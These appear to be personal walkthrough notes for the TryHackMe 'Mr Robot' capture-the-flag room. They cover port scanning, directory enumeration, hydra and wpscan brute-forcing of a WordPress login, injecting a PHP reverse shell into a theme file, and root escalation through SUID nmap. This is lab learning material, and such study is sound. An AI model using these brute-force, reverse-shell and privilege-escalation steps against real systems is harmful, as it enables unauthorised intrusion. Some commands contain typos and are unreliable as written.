All steps and concepts about CTF Mr Robot https://tryhackme.com/room/mrrobot

1 - Start Machine on tryhackme 

2 - Connect on VPN (download configuration file and connect via terminal)

    sudo openvpn lfsain.ovpn

3 - Test IP with ping 10.10.94.232

3 - Make PortScaning with nmap

    sudo nmap -sS 10.10.94.232 | tee nmap-ss.txt (-sS quick scan , tee to save on txt file)

    returned:

    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

4 - So, the return of before step, there is a service HTTP running at 80 port

    If open the browser with ip adress, it'll show a web page animation of Mr Robot

5 - It's talked about Directories of Web Application on video class

6 - 'Dirb' is used to map all the know Directories tha can exists and are common
    
    On /usr/share/wordlists/dirb/

    dirb http://10.10.94.232/ -o dirb.txt (-o save output on file)

7 - There is the file http://10.10.94.232/robots.txt, so , if you open on browser will return some folders to be avoid by Google crawlers, like:

    User-agent: *
    fsocity.dic
    key-1-of-3.txt

    So, there is one, saying to dont open the 'key-1-of-3.txt'

    If you access on browser like http://10.10.94.232/key-1-of-3.txt

    It return the firt flag of CTF, just paste it on tryhackme

8 - The fsocity.dic is a wordlist with many words. So we'll download it

    wget http://10.10.94.232/fsocity.dic

9 - The fsocity.dic has many repeated words. To get it cleared, we need run 

    sort fsocity.dic | uniq > unicos.txt

9 - NOTE: It's a Wordpress running, because on path /feed return on dirb

10 - 'Attack Brutal Force' on wp-login form . 

    It's talked too about 'Burp Suite' on video class
    
    The 'Burp Suite' analises how work the connection between your machine and target.

    We need it to know how the login form works and url, param's etc

    We'll use the 'hydra' to automaze the process

    hydra -L unicos.txt -p admin 10.10.94.232 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.94.232%2Fwp-admin%2F&testcookie=1:Invalid username" -F -V
    
    (-L list, -p password, http-post-form is the hydra resource, -F firt ocour stop, -V verbose and see on terminal whats goin on)

    The firt user found is 'elliot'

11 - With the user, we will force the password with hydra, with same unicos.txt file

    hydra -l elliot -p unicos.txt 10.10.94.232 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.94.232%2Fwp-admin%2F&testcookie=1:Invalid username" -F -V

    or with 'wpscan': (diferrence is thar wpscan is focused on wordpress 'Attack brute force')

    wpscan --url 10.10.6.242 --passwords unicos.txt --usernames elliot

    password found 'ER28-0652'

12 - On Kali linux there are some prepered shell in many languages, 

    Like we are with Wordpress, we'll use php. 
    
    They are on /usr/share/webshells/php

13 - Get the content of shell 'cat php-reverse-shell.php'

14 - 44:53 Inject this script on admin page of wordpress, by copy and paste, change only the variable of connection database with the ip host and port.

    You can edit in - Appearence > Editor > archive.php  

    The port used to connect on database was 1337 

    It need be open on Kali connection with netcat, and listen it on this port

    nc -lp 1337 -vv

15 - Save the edition you was doing on admin page

16 - Access this file (you edited) on webbrowser http://10.10.24.68/wp-content/themes/twentyfifteen/archive.php 

17 - It'll open the ssh connection to be runned like user 'default' (Didn't undestand how was made this ssh connection)

    Maybe by ' tune connection ' opened by script executed

18 - Execute python with 'spawn shell' hack

    python - c 'import pty: pty.spawn("/bin/sh")'

19 - Change the current user to 'robot' user , 'su robot' password was 'abcd.....wxyz'

20 - On ~/ folder of machine has the seconde key-2-of-3.txt

    822c73956184f694993bede3eb39f959

21 - The next step is upgrade access level to the user logged robot - 'escalate privilege on linux'
    
    Search for executables that can do it for us

    find / -user root -perm -4000 2>/dev/null

22 - gtfobins.github.io can show examples of 'escalate privilege'

23 - nmap is a hint for step 3

24 - With gtfobins, seach for nmap, we see this command:

    nmap --interactive
    
    !sh

    whoami

    I'll be the root user

25 - On /root folder there is the file key-3-of-3.txt, just cat it
